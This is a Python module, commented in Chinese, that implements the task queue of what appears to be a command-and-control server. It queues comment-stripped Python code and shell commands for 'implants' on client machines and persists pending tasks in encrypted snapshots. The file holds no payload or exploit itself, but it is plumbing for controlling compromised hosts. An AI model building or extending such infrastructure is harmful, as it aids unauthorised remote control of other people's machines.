"""
server/task_queue.py — 每客户端独立 FIFO 任务队列，线程安全。

Task: 单个待执行任务 (task_id, code, created_at, result_processor)
TaskQueue: 管理所有客户端的任务队列（deque 实现，T4.7）
"""

import uuid
import threading
from collections import deque
from datetime import datetime
from typing import Optional

from server.core.pycode import strip_py_comments
from server.core.pycompat import downgrade_py35


class Task:
    """单个任务。

    py=True（默认）表示 code 是**下发给植入物执行的 Python 代码**：
    构造时统一剥掉 `#` 注释（docstring 保留）——所有下发路径（模块 / raw /
    record_exec / stage / uplevel / 续传 / 快照恢复）都经这里，单点保证
    "下发到植入物端的 Python 代码零注释"。
    py=False 用于非 Python 的任务文本（shell 透传命令、`!cancel` 控制指令），
    这类文本里 `#` 可能是命令的一部分，不能动。
    """

    def __init__(self, code: str, is_init: bool = False,
                 task_id: Optional[str] = None,
                 result_processor: str = "",
                 proc_arg: str = "",
                 record: bool = False,
                 py: bool = True):
        self.task_id = task_id or str(uuid.uuid4())
        self.py = py
        self.code = downgrade_py35(strip_py_comments(code)) if py else code
        self.is_init = is_init
        self.created_at = datetime.now()
        self.result_processor = result_processor  # Q7：结果处理 server 模块名
        self.proc_arg = proc_arg                  # 处理器参数（如 download 落盘路径）
        self.record = record                      # True=植入物只记录不上报(record_exec)

    def __repr__(self) -> str:
        return f"Task({self.task_id[:8]}..., init={self.is_init})"


class TaskQueue:
    """线程安全的任务队列管理器。

    每个 client_id 维护独立 FIFO 队列（deque）。
    支持 push / pop / push_front / peek / clear / pending_count。
    """

    def __init__(self, max_tasks_per_client: int = 100, on_change=None):
        self._max_tasks = max_tasks_per_client
        self._queues: dict[str, deque] = {}
        self._lock = threading.Lock()
        # 落盘回调(2026-09-28):队列变更 → 置脏, 由 StatePersister 合并写盘。
        # 用 None 默认值保持"没接落盘也能用"(脚本/测试直接建 TaskQueue 时)。
        self._on_change = on_change

    def _touch(self) -> None:
        cb = self._on_change
        if cb is None:
            return
        try:
            cb()
        except Exception:
            pass

    def snapshot(self) -> dict:
        """待办任务快照(加密落盘用)。锁内取, 返回纯数据。"""
        with self._lock:
            return {cid: [{"task_id": t.task_id, "code": t.code,
                           "is_init": bool(t.is_init),
                           "created_at": t.created_at.isoformat(),
                           "result_processor": t.result_processor or "",
                           "proc_arg": t.proc_arg or "",
                           "py": bool(getattr(t, "py", True)),
                           "record": bool(getattr(t, "record", False))}
                          for t in q]
                    for cid, q in self._queues.items() if q}

    def apply_snapshot(self, data: dict) -> int:
        """把快照灌回队列(重启恢复用)。返回恢复的任务数。已有队列不覆盖。"""
        n = 0
        if not isinstance(data, dict):
            return 0
        with self._lock:
            for cid, items in data.items():
                if not isinstance(cid, str) or not isinstance(items, list):
                    continue
                q = self._queues.setdefault(cid, deque())
                for it in items[:self._max_tasks]:
                    if not isinstance(it, dict) or not it.get("code"):
                        continue
                    try:
                        task = Task(code=str(it["code"]),
                                    is_init=bool(it.get("is_init")),
                                    task_id=str(it.get("task_id") or "") or None,
                                    result_processor=str(it.get("result_processor") or ""),
                                    proc_arg=str(it.get("proc_arg") or ""),
                                    py=bool(it.get("py", True)),
                                    record=bool(it.get("record")))
                    except Exception:
                        continue
                    try:
                        task.created_at = datetime.fromisoformat(str(it.get("created_at")))
                    except (TypeError, ValueError):
                        pass          # 时间戳坏了不影响任务本体, 用当前时间
                    if len(q) < self._max_tasks:
                        q.append(task)
                        n += 1
        return n

    def push(self, client_id: str, task: Task) -> bool:
        """将任务入队（队尾）。返回 True 成功，False 队列满。"""
        with self._lock:
            if client_id not in self._queues:
                self._queues[client_id] = deque()
            if len(self._queues[client_id]) >= self._max_tasks:
                return False
            self._queues[client_id].append(task)
        self._touch()
        return True

    def push_front(self, client_id: str, task: Task) -> bool:
        """将任务插到队头（断线重发保序，10.2）。"""
        with self._lock:
            if client_id not in self._queues:
                self._queues[client_id] = deque()
            if len(self._queues[client_id]) >= self._max_tasks:
                return False
            self._queues[client_id].appendleft(task)
        self._touch()
        return True

    def pop(self, client_id: str) -> Optional[Task]:
        """从队列头部弹出一个任务 (FIFO)。"""
        with self._lock:
            queue = self._queues.get(client_id)
            if not queue:
                return None
            task = queue.popleft()
        self._touch()
        return task

    def update_task(self, client_id: str, task_id: str, code: str) -> bool:
        """改队列中某任务的代码(未下发时)。返回是否找到该任务。

        ⚠ 消费者在 web 层(flowscan/c2_bridge.py 的 task_update, 面板"编辑待办任务"),
        不在 c2_server/ 内 —— 判死代码必须全仓 grep(2026-09-28 因此误删过本方法)。
        """
        with self._lock:
            for t in self._queues.get(client_id, ()):
                if t.task_id == task_id:
                    t.code = code
                    self._touch()
                    return True
        return False

    def delete_task(self, client_id: str, task_id: str) -> bool:
        """从队列删除某任务(未下发时)。返回是否找到并删除(web 层面板"删除待办任务")。"""
        with self._lock:
            q = self._queues.get(client_id)
            if not q:
                return False
            for i, t in enumerate(q):
                if t.task_id == task_id:
                    del q[i]
                    self._touch()
                    return True
        return False

    def clear(self, client_id: str) -> None:
        """清空指定客户端的所有任务。"""
        with self._lock:
            self._queues.pop(client_id, None)
        self._touch()

    def pending_count(self, client_id: str) -> int:
        """返回待处理任务数。"""
        with self._lock:
            queue = self._queues.get(client_id)
            return len(queue) if queue else 0

    def set_max_tasks(self, n: int) -> None:
        """更新每客户端任务上限（reload 命令热重载配置用）。"""
        self._max_tasks = n
